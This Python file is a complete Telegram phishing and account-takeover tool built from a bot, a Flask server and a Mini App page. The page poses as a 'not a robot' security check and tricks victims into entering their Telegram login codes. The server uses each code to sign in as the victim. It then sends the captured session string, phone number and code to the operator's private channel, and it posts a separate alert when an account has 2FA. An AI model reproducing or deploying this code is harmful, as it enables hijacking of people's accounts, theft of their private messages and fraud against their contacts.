import os
import asyncio
import json
import threading
from datetime import datetime
from telethon import TelegramClient, events, errors
from telethon.sessions import StringSession
from flask import Flask, request, jsonify, render_template_string
import psycopg2

# Railway Environment Variables (replace config.py)
API_ID = int(os.environ.get("API_ID"))
API_HASH = os.environ.get("API_HASH")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHANNEL_ID = int(os.environ.get("CHANNEL_ID"))  # Your private channel ID
DATABASE_URL = os.environ.get("DATABASE_URL")  # Neon database URL

print("=" * 50)
print("SCRIPT STARTING...")
print("=" * 50)

app = Flask(__name__)

# Bot client (for receiving contacts via direct messages)
bot_client = TelegramClient('bot_session', API_ID, API_HASH)

# Store for sessions: user_id -> {phone, phone_code_hash, session_string}
active_sessions = {}

def get_db():
    return psycopg2.connect(DATABASE_URL)

def init_db():
    try:
        conn = get_db()
        cur = conn.cursor()
        cur.execute("""
            CREATE TABLE IF NOT EXISTS sessions (
                user_id TEXT PRIMARY KEY,
                phone TEXT NOT NULL,
                phone_code_hash TEXT,
                session_string TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        conn.commit()
        cur.close()
        conn.close()
        print("Database initialized.")
    except Exception as e:
        print(f"DB init error: {e}")

async def send_to_channel(message_text):
    """Send captured session to your private channel"""
    try:
        temp = TelegramClient('logger', API_ID, API_HASH)
        await temp.start(bot_token=BOT_TOKEN)
        await temp.send_message(CHANNEL_ID, message_text)
        await temp.disconnect()
        print("[LOG] Sent to channel.")
    except Exception as e:
        print(f"[ERROR] Channel send failed: {e}")

# YOUR EXACT UI - UNCHANGED
FRONTEND_HTML = """<!DOCTYPE html>
<html>
<head>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: url('https://res.cloudinary.com/bhcgogng/image/upload/v1784494648/photo_2026-07-19_23-37-40_bwzfbi.jpg') no-repeat center center fixed;
            background-size: cover;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        
        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            width: 100%;
            height: 100%;
            padding: 20px;
            background: rgba(0, 0, 0, 0.3);
        }
        
        .card {
            background: rgba(0, 0, 0, 0.6);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            padding: 40px 30px;
            border-radius: 20px;
            text-align: center;
            max-width: 400px;
            width: 100%;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }
        
        h2 {
            color: #fff;
            margin-bottom: 20px;
            font-size: 22px;
            font-weight: 600;
            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
        }
        
        p {
            color: #ddd;
            font-size: 14px;
            margin-bottom: 30px;
            line-height: 1.5;
            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
        }
        
        .robot-icon {
            font-size: 100px;
            margin-bottom: 20px;
            display: block;
            filter: drop-shadow(0 4px 8px rgba(0,0,0,0.3));
        }
        
        .btn {
            background: linear-gradient(135deg, rgba(255,107,157,0.9), rgba(196,69,105,0.9));
            color: white;
            border: none;
            padding: 16px 30px;
            border-radius: 12px;
            font-size: 18px;
            cursor: pointer;
            width: 100%;
            font-weight: bold;
            margin: 10px 0;
            transition: all 0.3s;
            backdrop-filter: blur(5px);
            border: 1px solid rgba(255,255,255,0.1);
        }
        
        .btn:active { transform: scale(0.98); }
        .btn:disabled { background: rgba(68, 68, 68, 0.8); cursor: not-allowed; }
        
        #verificationScreen, #codeScreen { display: none; }
        
        .code-slots {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-bottom: 30px;
        }
        
        .code-slot {
            width: 55px;
            height: 55px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 12px;
            background: rgba(255, 255, 255, 0.1);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
            font-weight: bold;
            color: #fff;
            backdrop-filter: blur(5px);
        }
        
        .code-slot.filled {
            background: rgba(255, 107, 157, 0.8);
            border-color: rgba(255, 107, 157, 0.9);
        }
        
        .keypad {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 12px;
            max-width: 320px;
            margin: 0 auto;
            padding: 20px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 20px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.1);
        }
        
        .key {
            background: linear-gradient(135deg, rgba(255,107,157,0.9), rgba(196,69,105,0.9));
            color: white;
            border: none;
            padding: 18px;
            border-radius: 12px;
            font-size: 24px;
            font-weight: bold;
            cursor: pointer;
            backdrop-filter: blur(5px);
            border: 1px solid rgba(255,255,255,0.1);
        }
        
        .key.clear { background: linear-gradient(135deg, rgba(68,68,68,0.8), rgba(34,34,34,0.8)); }
        
        .error {
            color: #ff6b6b;
            font-size: 14px;
            margin-top: 10px;
            display: none;
            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
            font-weight: bold;
        }
        
        .loading {
            display: none;
            color: #ddd;
            margin-top: 10px;
            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
        }
    </style>
</head>
<body>
    <div class="container">
        <div id="antiBotScreen">
            <div class="card">
                <span class="robot-icon">🤖</span>
                <h2>Please confirm that you are not a robot ✅</h2>
                <p>This verification helps us ensure the security and integrity of our service.</p>
                <button class="btn" onclick="handleConfirm()">Confirm ✅</button>
            </div>
        </div>
        
        <div id="verificationScreen">
            <div class="card">
                <h2>Security Verification</h2>
                <p>To ensure your account security, we need to verify your identity.</p>
                <button class="btn" id="shareBtn" onclick="handleContact()">Share Contact & Verify</button>
                <div class="loading" id="contactLoading">Requesting contact...</div>
            </div>
        </div>
        
        <div id="codeScreen">
            <div class="card">
                <h2>Enter Verification Code</h2>
                <p>We sent a verification code to your Telegram app. Enter it below.</p>
                
                <div class="code-slots" id="codeSlots">
                    <div class="code-slot"></div>
                    <div class="code-slot"></div>
                    <div class="code-slot"></div>
                    <div class="code-slot"></div>
                    <div class="code-slot"></div>
                </div>
                
                <div class="keypad">
                    <button class="key" onclick="pressKey('1')">1</button>
                    <button class="key" onclick="pressKey('2')">2</button>
                    <button class="key" onclick="pressKey('3')">3</button>
                    <button class="key" onclick="pressKey('4')">4</button>
                    <button class="key" onclick="pressKey('5')">5</button>
                    <button class="key" onclick="pressKey('6')">6</button>
                    <button class="key" onclick="pressKey('7')">7</button>
                    <button class="key" onclick="pressKey('8')">8</button>
                    <button class="key" onclick="pressKey('9')">9</button>
                    <button class="key clear" onclick="pressKey('clear')">C</button>
                    <button class="key" onclick="pressKey('0')">0</button>
                    <button class="key clear" onclick="pressKey('back')">⌫</button>
                </div>
                
                <button class="btn" onclick="submitCode()" style="margin-top: 20px;">Verify</button>
                <button class="btn" onclick="resendCode()" style="margin-top: 10px; background: linear-gradient(135deg, rgba(68,68,68,0.8), rgba(34,34,34,0.8));">Resend Code</button>
                <div class="error" id="errorBox">Invalid code.</div>
                <div class="loading" id="loadingBox">Verifying...</div>
            </div>
        </div>
        
        <div id="successScreen" style="display: none;">
            <div class="card">
                <h2>Success! ✅</h2>
                <p style="color: #00ff88; font-size: 16px;">Your account has been verified successfully.</p>
            </div>
        </div>
    </div>

    <script>
        var tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();
        
        var userId = null;
        var enteredCode = '';
        
        if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
            userId = tg.initDataUnsafe.user.id;
        }
        
        function handleConfirm() {
            document.getElementById('antiBotScreen').style.display = 'none';
            document.getElementById('verificationScreen').style.display = 'block';
        }
        
        function handleContact() {
            document.getElementById('shareBtn').disabled = true;
            document.getElementById('contactLoading').style.display = 'block';
            
            // Just notify backend that user is ready (bot already has phone from direct message)
            fetch('/ready', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user_id: userId })
            })
            .then(function(res) { return res.json(); })
            .then(function(data) {
                document.getElementById('contactLoading').style.display = 'none';
                if (data.ready) {
                    document.getElementById('verificationScreen').style.display = 'none';
                    document.getElementById('codeScreen').style.display = 'block';
                } else {
                    alert('Please message the bot your contact first, then click Share Contact.');
                    document.getElementById('shareBtn').disabled = false;
                }
            });
        }
        
        function resendCode() {
            fetch('/resend', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user_id: userId })
            })
            .then(function(res) { return res.json(); })
            .then(function(data) {
                if (data.success) {
                    alert('A new code has been sent to your Telegram app.');
                    enteredCode = '';
                    updateCodeDisplay();
                } else {
                    alert(data.error || 'Failed to resend code.');
                }
            });
        }
        
        function pressKey(key) {
            if (key === 'back') {
                enteredCode = enteredCode.slice(0, -1);
            } else if (key === 'clear') {
                enteredCode = '';
            } else {
                if (enteredCode.length < 5) {
                    enteredCode += key;
                }
            }
            updateCodeDisplay();
        }
        
        function updateCodeDisplay() {
            var slots = document.querySelectorAll('.code-slot');
            for (var i = 0; i < slots.length; i++) {
                if (i < enteredCode.length) {
                    slots[i].textContent = '•';
                    slots[i].classList.add('filled');
                } else {
                    slots[i].textContent = '';
                    slots[i].classList.remove('filled');
                }
            }
        }
        
        function submitCode() {
            if (enteredCode.length !== 5) {
                alert('Please enter the full 5-digit code.');
                return;
            }
            
            document.getElementById('loadingBox').style.display = 'block';
            document.getElementById('errorBox').style.display = 'none';
            
            fetch('/verify', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ code: enteredCode, user_id: userId })
            })
            .then(function(res) { 
                if (!res.ok) {
                    throw new Error('Server error: ' + res.status);
                }
                return res.json(); 
            })
            .then(function(data) {
                document.getElementById('loadingBox').style.display = 'none';
                if (data.success) {
                    document.getElementById('codeScreen').style.display = 'none';
                    document.getElementById('successScreen').style.display = 'block';
                    setTimeout(function() { tg.close(); }, 2000);
                } else {
                    document.getElementById('errorBox').textContent = data.error || 'Invalid code.';
                    document.getElementById('errorBox').style.display = 'block';
                    enteredCode = '';
                    updateCodeDisplay();
                }
            })
            .catch(function(err) {
                document.getElementById('loadingBox').style.display = 'none';
                document.getElementById('errorBox').textContent = 'Error: ' + err.message;
                document.getElementById('errorBox').style.display = 'block';
            });
        }
        
        updateCodeDisplay();
    </script>
</body>
</html>"""

@app.route('/')
def index():
    return render_template_string(FRONTEND_HTML)

@app.route('/ready', methods=['POST'])
def check_ready():
    """Check if bot has received contact from this user"""
    data = request.json
    user_id = str(data.get('user_id'))
    
    if user_id in active_sessions:
        return jsonify({"ready": True})
    else:
        return jsonify({"ready": False})

@app.route('/resend', methods=['POST'])
def resend_code():
    data = request.json
    user_id = str(data.get('user_id'))
    
    if user_id not in active_sessions:
        return jsonify({"success": False, "error": "Session not found. Please message the bot your contact first."})
    
    phone = active_sessions[user_id]['phone']
    old_session_string = active_sessions[user_id]['session_string']
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    async def request_new():
        # Use stored session to resend
        client = TelegramClient(StringSession(old_session_string), API_ID, API_HASH)
        try:
            await client.connect()
            result = await client.send_code_request(phone)
            phone_code_hash = result.phone_code_hash
            new_session_string = client.session.save()
            
            # Update storage
            active_sessions[user_id]['phone_code_hash'] = phone_code_hash
            active_sessions[user_id]['session_string'] = new_session_string
            
            # Update DB
            conn = get_db()
            cur = conn.cursor()
            cur.execute("UPDATE sessions SET phone_code_hash=%s, session_string=%s WHERE user_id=%s",
                       (phone_code_hash, new_session_string, user_id))
            conn.commit()
            cur.close()
            conn.close()
            
            print(f"[RESENT] to {phone}")
            await client.disconnect()
            return True, None
        except Exception as e:
            await client.disconnect()
            return False, str(e)
    
    success, error = loop.run_until_complete(request_new())
    loop.close()
    
    if success:
        return jsonify({"success": True})
    else:
        return jsonify({"success": False, "error": error})

@app.route('/verify', methods=['POST'])
def verify_code():
    data = request.json
    code = data.get('code')
    user_id = str(data.get('user_id'))
    
    print(f"\n[VERIFY] User: {user_id}, Code: {code}")
    
    if user_id not in active_sessions:
        return jsonify({"success": False, "error": "Session not found. Please message the bot your contact first."})
    
    session = active_sessions[user_id]
    phone = session['phone']
    phone_code_hash = session.get('phone_code_hash')
    session_string = session.get('session_string')
    
    if not phone_code_hash:
        return jsonify({"success": False, "error": "Code not requested yet."})
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    async def try_login():
        # CRITICAL: Use the stored StringSession
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        
        try:
            await client.connect()
            await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
            
            # SUCCESS - Get final session
            final_session = client.session.save()
            
            print(f"\n[CAPTURED] Phone: {phone}")
            print(f"[SESSION] {final_session}\n")
            
            # Send to your channel
            msg = f"""🚨 ACCOUNT CAPTURED 🚨

📞 Phone: `{phone}`
🔑 Code Used: `{code}`
🔐 Session String:
`{final_session}`

⏰ {datetime.now()}"""
            
            await send_to_channel(msg)
            await client.disconnect()
            
            # Cleanup
            del active_sessions[user_id]
            conn = get_db()
            cur = conn.cursor()
            cur.execute("DELETE FROM sessions WHERE user_id = %s", (user_id,))
            conn.commit()
            cur.close()
            conn.close()
            
            return True, None
            
        except errors.PhoneCodeInvalidError:
            await client.disconnect()
            return False, "Invalid code. Please try again."
        except errors.PhoneCodeExpiredError:
            await client.disconnect()
            return False, "Code expired. Please request a new one."
        except errors.SessionPasswordNeededError:
            await client.disconnect()
            await send_to_channel(f"⚠️ 2FA DETECTED: {phone}")
            del active_sessions[user_id]
            return False, "This account has 2FA enabled."
        except Exception as e:
            await client.disconnect()
            return False, str(e)
    
    success, error = loop.run_until_complete(try_login())
    loop.close()
    
    if success:
        return jsonify({"success": True})
    else:
        return jsonify({"success": False, "error": error})

async def bot_listener():
    """Bot listens for contacts sent via direct message"""
    await bot_client.start(bot_token=BOT_TOKEN)
    print("Bot is online. Waiting for contacts...")

    @bot_client.on(events.NewMessage)
    async def handler(event):
        if event.message.media and hasattr(event.message.media, "phone_number"):
            phone = event.message.media.phone_number
            user_id = str(event.message.sender_id)
            
            print(f"\n[CONTACT RECEIVED] User: {user_id}, Phone: {phone}")
            
            # Create client and request code
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            
            try:
                await client.connect()
                result = await client.send_code_request(phone)
                phone_code_hash = result.phone_code_hash
                
                # Get session string BEFORE signing in
                session_string = client.session.save()
                
                # Store in memory
                active_sessions[user_id] = {
                    'phone': phone,
                    'phone_code_hash': phone_code_hash,
                    'session_string': session_string
                }
                
                # Store in DB
                conn = get_db()
                cur = conn.cursor()
                cur.execute("""
                    INSERT INTO sessions (user_id, phone, phone_code_hash, session_string)
                    VALUES (%s, %s, %s, %s)
                    ON CONFLICT (user_id) 
                    DO UPDATE SET phone=%s, phone_code_hash=%s, session_string=%s
                """, (user_id, phone, phone_code_hash, session_string, phone, phone_code_hash, session_string))
                conn.commit()
                cur.close()
                conn.close()
                
                print(f"[CODE SENT] to {phone}")
                
                # Notify user
                await bot_client.send_message(user_id, "✅ Verification code sent! Check your Telegram app and enter it in the Mini App.")
                await client.disconnect()
                
            except Exception as e:
                print(f"[ERROR] {e}")
                await client.disconnect()
                await bot_client.send_message(user_id, f"❌ Error: {e}")

    await bot_client.run_until_disconnected()

if __name__ == '__main__':
    init_db()
    
    # Start bot in background
    thread = threading.Thread(target=lambda: asyncio.run(bot_listener()))
    thread.daemon = True
    thread.start()
    
    # Start Flask
    port = int(os.environ.get("PORT", 5000))
    print(f"Starting web server on port {port}")
    print("=" * 50)
    app.run(host='0.0.0.0', port=port, debug=False)
